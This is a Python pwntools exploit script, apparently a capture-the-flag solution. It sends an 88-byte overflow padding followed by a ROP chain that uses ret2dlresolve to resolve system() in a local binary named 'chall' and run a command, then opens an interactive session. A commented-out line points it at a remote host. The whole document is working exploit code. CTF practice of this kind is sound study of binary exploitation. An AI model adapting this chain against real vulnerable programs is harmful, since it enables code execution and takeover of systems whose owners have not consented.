#!usr/bin/env/python3
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
offset = 88
elf = ELF("./chall")
p = process("./chall")

# p = remote("34.125.56.151",3333)
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()
print(rop.dump())

payload = b"A"*offset + raw_rop + dlresolve.payload

p.sendline(payload)
p.interactive()



